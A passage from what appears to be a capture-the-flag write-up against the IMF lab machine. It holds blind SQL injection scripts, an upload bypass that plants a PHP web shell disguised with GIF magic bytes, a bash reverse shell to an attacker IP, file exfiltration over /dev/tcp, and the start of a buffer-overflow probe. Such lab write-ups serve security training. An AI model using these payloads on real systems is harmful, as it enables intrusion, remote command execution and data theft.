  33   │                 sqli = main_url + f"'+and+(select+substring(table_name,{position_character},1)+from+information_schema.tables+where+table_schema='admin'+limit+{dbs},1)='{character}"
  34   │ 
  35   │                 p1.status(sqli)
  36   │ 
  37   │                 r = requests.get(sqli, cookies=cookies)
  38   │ 
  39   │                 if "Welcome to the IMF Administration." in r.text:
  40   │                     database += character
  41   │                     p2.status(database)
  42   │                     break
  43   │ 
  44   │             if database[-1:] == ",":
  45   │                 database += " "
  46   │ 
  47   │         if database[-1:] != "," and len(database) > 0:
  48   │             database += ","
  49   │ 
  50   │     if database[-1:] == ",":
  51   │         database = database[:-1]
  52   │ 
  53   │     p2.success(database)
  54   │ 
  55   │ 
  56   │ if __name__ == '__main__':
  57   │ 
  58   │     makeRequest()

```

output

```python3
[▆] Fuerza bruta: http://192.168.100.52/imfadministrator/cms.php?pagename=home'+and+(select+substring(table_name,1,1)+from+information_schema.tables+where+table_schema='admin'+limit+2,1)='r
[v] Tables: pages

```
now let's find the columns. ```+and+(select+substring(column_name,{position_character},1)+from+information_schema.columns+where+table_schema='admin'+and+table_name='pages'+limit+{dbs},1)='{character}"```

```python3
   1   │ from pwn import *
   2   │ import requests, pdb, signal, time, sys, string
   3   │ 
   4   │ def def_handler(sig,frame):
   5   │     print("\n\n[!] Saliendo...\n")
   6   │     sys.exit(1)
   7   │ 
   8   │ 
   9   │ # Ctrl+C
  10   │ signal.signal(signal.SIGINT, def_handler)
  11   │ 
  12   │ #Variables Globales
  13   │ main_url = "http://192.168.100.52/imfadministrator/cms.php?pagename=home"
  14   │ characters = string.ascii_lowercase + '-_'
  15   │ 
  16   │ 
  17   │ def makeRequest():
  18   │ 
  19   │     cookies = {'PHPSESSID': 'rftk9b1ducfunqjmrks8bcfb04'}
  20   │ 
  21   │     database = ""
  22   │     p1 =log.progress("Fuerza bruta")
  23   │     p1.status("Iniciando proceso de fuerza bruta")
  24   │ 
  25   │     time.sleep(2)
  26   │ 
  27   │     p2 = log.progress("Columns")
  28   │ 
  29   │ 
  30   │     for dbs in range(0, 6):
  31   │         for position_character in range(1, 30): 
  32   │             for character in characters:
  33   │                 sqli = main_url + f"'+and+(select+substring(column_name,{position_character},1)+from+information_schema.columns+where+table_schema='admin'+and+table_name='pages'+limit+{dbs},1)='{character}"
  34   │ 
  35   │                 p1.status(sqli)
  36   │ 
  37   │                 r = requests.get(sqli, cookies=cookies)
  38   │ 
  39   │                 if "Welcome to the IMF Administration." in r.text:
  40   │                     database += character
  41   │                     p2.status(database)
  42   │                     break
  43   │ 
  44   │             if database[-1:] == ",":
  45   │                 database += " "
  46   │ 
  47   │         if database[-1:] != "," and len(database) > 0:
  48   │             database += ","
  49   │ 
  50   │     if database[-1:] == ",":
  51   │         database = database[:-1]
  52   │ 
  53   │     p2.success(database)
  54   │ 
  55   │ 
  56   │ if __name__ == '__main__':
  57   │ 
  58   │     makeRequest()
  
  ```
  
  the output 
  
  ```python 
  [▝] Fuerza bruta: http://192.168.100.52/imfadministrator/cms.php?pagename=home'+and+(select+substring(column_name,29,1)+from+information_schema.columns+where+table_schema='admin'+and+table_name='pages'+limit+5,1)='_
[+] Columns: id,pagename,pagedata,
  
  ```
  
  now for the data is important to find where dbs are opened in this session 
  
  from  the BurpSuite /imfadministrator/cms.php?pagename=home'+and+(select+database())%3d'admin
  
  ```php
  GET /imfadministrator/cms.php?pagename=home'+and+(select+database())%3d'admin HTTP/1.1

Host: 192.168.100.52

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://192.168.100.52/imfadministrator/cms.php?pagename=home

Accept-Encoding: gzip, deflate

Accept-Language: es-419,es;q=0.9

Cookie: PHPSESSID=rftk9b1ducfunqjmrks8bcfb04

Connection: close

  ```
  
  output
  
  
  ```php
  <br /><br/>

Welcome to the IMF Administration.</body>

</html>


  ```
what happens if instead of admin we add another thing that is not true ?

let's check 
```php
GET /imfadministrator/cms.php?pagename=home'+and+(select+database())%3d'adminoes HTTP/1.1

Host: 192.168.100.52

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://192.168.100.52/imfadministrator/cms.php?pagename=home

Accept-Encoding: gzip, deflate

Accept-Language: es-419,es;q=0.9

Cookie: PHPSESSID=rftk9b1ducfunqjmrks8bcfb04

Connection: close



```
output, that's how we make sure the databased selected. look we did not receive imf admin 

```php
HTTP/1.1 200 OK

Date: Sun, 07 May 2023 03:01:59 GMT

Server: Apache/2.4.18 (Ubuntu)

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate

Pragma: no-cache

Vary: Accept-Encoding

Content-Length: 285

Connection: close

Content-Type: text/html; charset=UTF-8



<html>

<head>

<title>IMF CMS</title>

</head>

<body>

<h1>IMF CMS</h1>

Menu: 

<a href='cms.php?pagename=home'>Home</a> | 

<a href='cms.php?pagename=upload'>Upload Report</a> | 

<a href='cms.php?pagename=disavowlist'>Disavowed list</a> | 

Logout

<br /><br/>

</body>

</html>

```


now the database that this SQL is using is admin 

so we can take an advantage of it and search for the content that is on pagename


```php
   1   │ from pwn import *
   2   │ import requests, pdb, signal, time, sys, string
   3   │ 
   4   │ def def_handler(sig,frame):
   5   │     print("\n\n[!] Saliendo...\n")
   6   │     sys.exit(1)
   7   │ 
   8   │ 
   9   │ # Ctrl+C
  10   │ signal.signal(signal.SIGINT, def_handler)
  11   │ 
  12   │ #Variables Globales
  13   │ main_url = "http://192.168.100.52/imfadministrator/cms.php?pagename=home"
  14   │ characters = string.ascii_lowercase + '-_'
  15   │ 
  16   │ 
  17   │ def makeRequest():
  18   │ 
  19   │     cookies = {'PHPSESSID': 'rftk9b1ducfunqjmrks8bcfb04'}
  20   │ 
  21   │     database = ""
  22   │     p1 =log.progress("Fuerza bruta")
  23   │     p1.status("Iniciando proceso de fuerza bruta")
  24   │ 
  25   │     time.sleep(2)
  26   │ 
  27   │     p2 = log.progress("Data")
  28   │ 
  29   │ 
  30   │     for dbs in range(0, 6):
  31   │         for position_character in range(1, 30): 
  32   │             for character in characters:
  33   │                 sqli = main_url + f"'+and+(select+substring(pagename,{position_character},1)+from+pages+limit+{dbs},1)='{character}"
  34   │ 
  35   │                 p1.status(sqli)
  36   │ 
  37   │                 r = requests.get(sqli, cookies=cookies)
  38   │ 
  39   │                 if "Welcome to the IMF Administration." in r.text:
  40   │                     database += character
  41   │                     p2.status(database)
  42   │                     break
  43   │ 
  44   │             if database[-1:] == ",":
  45   │                 database += " "
  46   │ 
  47   │         if database[-1:] != "," and len(database) > 0:
  48   │             database += ","
  49   │ 
  50   │     if database[-1:] == ",":
  51   │         database = database[:-1]
  52   │ 
  53   │     p2.success(database)
  54   │ 
  55   │ 
  56   │ if __name__ == '__main__':
  57   │ 
  58   │     makeRequest()

```


output
```php
[┐] Fuerza bruta: http://192.168.100.52/imfadministrator/cms.php?pagename=home'+and+(select+substring(pagename,29,1)+from+pages+limit+5,1)='_
[+] Data: disavowlist,home,tutorials-incomplete,upload

```

seems to be routes from our page because we saw them here in port 80


```php

IMF CMS
Menu: Home | Upload Report | Disavowed list | Logout

Welcome to the IMF Administration.

```
let's try the new ones which is ```tutorials``` , ```tutorials-incomplete``` and upload

i got to tell you that actually sqmap will automate this attack but in OSCP we are no able to use SQL map so for that reason is better to try to do almost all the things manually 

for example 

```bash
❯ sqlmap -u "http://192.168.100.52/imfadministrator/cms.php?pagename=home" --cookie "PHPSESSID=rftk9b1ducfunqjmrks8bcfb04" --dbs --dbms=mysql --batch
``` 

well trying the routes that we saw before let's try them 
```bash
http://192.168.100.52/imfadministrator/cms.php?pagename=tutorials-incomplete
```
here we found a flag in QR code 

```php 
flag4{dXBsb2Fkcjk0Mi5waHA=}

```

seems to be base64 encode let;s encrypt it 


```bash 
❯ echo "dXBsb2Fkcjk0Mi5waHA=" | base64 -d; echo
uploadr942.php

```

seems to be a route let's get them 

```php
http://192.168.100.52/imfadministrator/uploadr942.php
```
output 

```bash 
Intelligence Upload Form
File to upload: Sin archivos seleccionados

upload
```

seems that we can upload an LFI let's try it 

first of all we need to create the LFI 


```php 
<?
   system("whoami")
?>

```
let's try to upload 


output


```php
Error: Invalid file type.
File to upload: Sin archivos seleccionados
```

This can be due to incorrect extension or content type, or the server may interpret the first bytes of the script as magic numbers.

Let's mitigate all the vulnerabilities that we thought of

extentions
we have to intercept the upload, and we could make a sniper attack with BurpSuite

step 1 intercept the upload by turnning on the "interception tab of burpSuite"

step 2 upload 

and from my side i receive this output 

```php
POST /imfadministrator/uploadr942.php HTTP/1.1

Host: 192.168.100.52

Content-Length: 316

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://192.168.100.52

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5RKwj5GwTJjAOK9j

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://192.168.100.52/imfadministrator/uploadr942.php

Accept-Encoding: gzip, deflate

Accept-Language: es-419,es;q=0.9

Cookie: PHPSESSID=rftk9b1ducfunqjmrks8bcfb04

Connection: close



------WebKitFormBoundary5RKwj5GwTJjAOK9j

Content-Disposition: form-data; name="file"; filename="whoami.php"

Content-Type: application/x-php



<?php
system("whoami")
?>


------WebKitFormBoundary5RKwj5GwTJjAOK9j

Content-Disposition: form-data; name="submit"



Upload

------WebKitFormBoundary5RKwj5GwTJjAOK9j--


```
press ```ctrl + i``` to send this to the intruder 

go to ```intruder``` press ```clear§``` and select the extention that we upload and press ```add``` example  it will appear likes this filename="whoami.```§php§" ```

go to payload tab ```payload``` go to add section and add the extentions example ```php1```,```php2```,```php3```,```html```,```jpg```,```gif```,```exe```,```php4```,```php5```,```pht```,```phtml```,```png```,```phar```

go to options tab and go to ```Grep - Extract``` and select ```add``` then ```fetch response``` 
and select ```bash Error: Invalid file type```

finally go to payloads 

and  press ```Start attack```

output

```bash 
 Error: Invalid file type
```
content type

Therefore, since we uploaded a .php file, I think it is interpreting something other than the extensions.

because if we check our > ```intruder``` > ```image Upload``` > ```Positions```

and take a look 
```php
------WebKitFormBoundary5RKwj5GwTJjAOK9j

Content-Disposition: form-data; name="file"; filename="whoami.§php§"

Content-Type: application/x-php

```
the content type is ```Content-Type: application/x-php``` 

let's change it 

the content type would be ```Content-Type: image/jpg```

```php

------WebKitFormBoundary5RKwj5GwTJjAOK9j

Content-Disposition: form-data; name="file"; filename="whoami.§php§"

Content-Type: image/jpg


```
let's try with another type


```php

------WebKitFormBoundary5RKwj5GwTJjAOK9j

Content-Disposition: form-data; name="file"; filename="whoami.§php§"

Content-Type: images/jpeg


```

magic numbers

let's try with changing the magic numbers, because idk if you know but  The first magic numbers, initially when you want to investigate a file, 


for example, when you are doing a Buffer Over Flow, the first thing would be to see what kind of binary it is, so we apply a ```file``` command to check the file

```bash
❯ file whoami.php
whoami.php: ASCII text
```


to see what type of file it is. This is based on the first bytes of the file's content.

```bash

   1   │ GIF8;
   2   │ <?php
   3   │ system("whoami")
   4   │ ?>

```
now we changed it so let's try to check again 

```bash
❯ file whoami.php
whoami.php: GIF image data 16188 x 26736
```

it says that is a gif because of the magic numbers, if you want to check more datailed apply a ```xxd``` command to check the first bytes of the file 

```bash 
❯ xxd whoami.php
00000000: 4749 4638 3b0a 3c3f 7068 700a 7379 7374  GIF8;.<?php.syst
00000010: 656d 2822 7768 6f61 6d69 2229 0a3f 3e0a  em("whoami").?>.

```


let's try to upload the same code but ofuscated

```php

<?php
eval(base64_decode(str_rot13('nafjre("jubnznvy")')); 
?>

```
with eval does not work let's try with command 

```php

<?php
$command=$_GET['cmd'];echo `$command`;
?>

```

we receive another output in extensions gif, jpgm, pneg

```
Error: Invalid file data.<form id="Upload" action="" enctype="multipart/form-data" method="post">
```
we might work with magic numbers 
look the output 

```bash 
File successfully uploaded.
<!-- fa9f9a59ae29 --><form id="Upload" action="" enctype="multipart/form-data" method="post">
```

the number seems to be a route and we saw a route called uploads under construction

let's try it 
```

http://192.168.100.52/imfadministrator/uploads/fa9f9a59ae29.gif?cmd=whoami

```

it works if you add the .gif let's make a revershell to get access | stay listening at 443 ```nc -nlvp 443```

```bash
http://192.168.100.52/imfadministrator/uploads/fa9f9a59ae29.gif?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.100.53/443 0>%261"
```

output 


```bash 
www-data@imf:/var/www/html/imfadministrator/uploads$ whoami 
www-data
www-data@imf:/var/www/html/imfadministrator/uploads$ 
```

## Privilage Escalation

checking inside 

i figure out the port open ```7788 ```

```bash 
www-data@imf:/$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:7788            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 192.168.100.52:44232    192.168.100.53:443      ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       1      0 192.168.100.52:80       192.168.100.53:52462    CLOSE_WAIT 
```

let's check inside 

```bash 

www-data@imf:/$ which nc
/bin/nc
www-data@imf:/$ hostname -I


192.168.100.52 
www-data@imf:/$ nc 192.168.100.52 7878


www-data@imf:/$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:7788            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      2 192.168.100.52:44232    192.168.100.53:443      ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       1      0 192.168.100.52:80       192.168.100.53:52462    CLOSE_WAIT


www-data@imf:/$ nc 192.168.100.52 7788
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : hola
Invalid Agent ID 
www-data@imf:/$ 

```

this app seems weird let's find where is the binary 

```bash 
www-data@imf:/usr/local/bin$ which agent 
/usr/local/bin/agent
```
if we run it is it the same binary ?

```./agent ```

```bash 
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 

```
let's check the binary and find, if it has the vulnerability called " BufferOverFlow"
first of all we have to get it, and send it to our personal desktop 
from target
```bash 
www-data@imf:/usr/local/bin$ cat < agent > /dev/tcp/192.168.100.53/443
```
to
```
nc -nlvp 443 > agent 
```
ls 

```bash

```
```
www-data@imf:/usr/local/bin$ md5sum agent
fabc1afd43f668df0b812213567d032c  agent
www-data@imf:/usr/local/bin$  

```
let's do the BufferOverFlow precheck

before to do it let's check the proc 
before to do it let's check the ```proc/sys/randomize_va_space```

```
We need to look for randomize_va_space in proc because here all the system processes are running. In fact, if we run top, we can see the main processes, but to see, for example, the swap that is virtual memory, we would not be able to see it in top. We have to go to proc and then do an ls. We will see that there are directories with names, and those directories with numbers are processes. So, if we want to see only the processes, we have to filter with "ls -d d" of directory and filter by numbers, which would be [1-9]*. At this point, we only see the system processes. To see the actual process, we have to open the smaps file. Here, we can find the characteristics of the process. If we simply view it, we will see an output with everything this process executes.

Therefore, if we do cat /proc/pid/smaps, where pid refers to one of the previously seen processes, let's say process 1, for example, it would be "cat /proc/1/smaps". Now, if we view all the output that was previously mentioned and filter with grep for the word "Swap," we can see how much swap this process is consuming.
```
This is just an example to explain that this can be done, and it is not necessary to view it. It's just to show that all the processes are in proc. So, as we said, we need to verify the proc/sys/kernel/randomize_va_space We need to check it to see if randomization is applied. if in the output appears 2 is because the randomization is applying, but if the output is 0 it's because the randomization is not applying 

```bash
www-data@imf /proc/sys/kernel/randomize_va_space
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /proc/sys/kernel/randomize_va_space
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
look the output it's 2 this is a measure to prevent buffer overflow attacks, but it can be bypassed when we will be analyzing the program. I'll explain it to you

from our personal desktop let's analyze the binare using a ltrace tool

```bash 
❯ ltrace ./agent
__libc_start_main(0x80485fb, 1, 0xfff380d4, 0x8048970 <unfinished ...>
setbuf(0xf7fa6d20, 0)                                                        = <void>
asprintf(0xfff37ff8, 0x80489f0, 0x2ddd984, 0xf7df4bde)                       = 8
puts("  ___ __  __ ___ "  ___ __  __ ___ 
)                                                    = 18
puts(" |_ _|  \\/  | __|  Agent" |_ _|  \/  | __|  Agent
)                                            = 25
puts("  | || |\\/| | _|   Reporting"  | || |\/| | _|   Reporting
)                                        = 29
puts(" |___|_|  |_|_|    System\n" |___|_|  |_|_|    System

)                                          = 27
printf("\nAgent ID : "
Agent ID : )                                                      = 12
fgets(hola
"hola\n", 9, 0xf7fa6580)                                               = 0xfff37ffe
strncmp("hola\n", "48093572", 8)                                             = 1
puts("Invalid Agent ID "Invalid Agent ID 
)                                                    = 18
+++ exited (status 254) +++
```
important output ```strncmp("hola\n", "48093572", 8) ```

seems that our input  is comparing to ```48093572``` let's add this comparasison instead of hola 

and we have access to the app

```bash 
❯ ./agent
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 48093572
Login Validated 
Main Menu:
1. Extraction Points
2. Request Extraction
3. Submit Report
0. Exit
Enter selection: 
```

let's continue doing the precheck, first of all we need to find where we could be able to add as much A's to currpt the program

```bash 
output 

❯ ./agent
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 48093572
Login Validated 
Main Menu:
1. Extraction Points
2. Request Extraction
3. Submit Report
0. Exit
Enter selection: 1

Extraction Points:
Staatsoper, Vienna, Austria
Blenheim Palace, Woodstock, Oxfordshire, England, UK
Great Windmill Street, Soho, London, England, UK
Fawley Power Station, Southampton, England, UK
Underground Station U4 Schottenring, Vienna, Austria
Old Town Square, Old Town, Prague, Czech Republic
Drake Hotel - 140 E. Walton Pl., Near North Side, Chicago, Illinois, USA
Ashton Park, Mosman, Sydney, New South Wales, Australia
Argyle Place, The Rocks, Sydney, New South Wales, Australia
```

we don't are able to add code here the 2ndo one is not vulneral at BOF

```bash 
❯ ./agent
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 48093572
Login Validated 
Main Menu:
1. Extraction Points
2. Request Extraction
3. Submit Report
0. Exit
Enter selection: 2

Extraction Request
Enter extraction location: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA